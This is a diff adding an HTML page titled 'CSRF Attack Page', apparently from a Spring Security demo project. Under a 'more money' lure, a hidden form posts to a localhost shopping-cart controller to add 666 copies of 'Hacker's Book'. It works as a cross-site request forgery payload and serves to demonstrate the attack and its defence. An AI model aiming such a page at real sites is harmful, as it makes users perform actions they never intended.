@@ -1,0 +1,18 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>CSRF Attack Page</title>
+</head>
+<body>
+	<h2>Add more money to your account!!!!</h2>
+	
+	<img src="money.png" alt="More Money" />
+
+	<form method="post" action="https://localhost:8443/SpringSecurity-CSRF-ShoppingCart/controller">
+		<input type="hidden" name="name" value="Hacker's Book"/>
+		<input type="hidden" name="quantity" value="666"/>
+		<input type="submit" name="action" value="Add" />
+	</form>
+
+</body>
+</html>
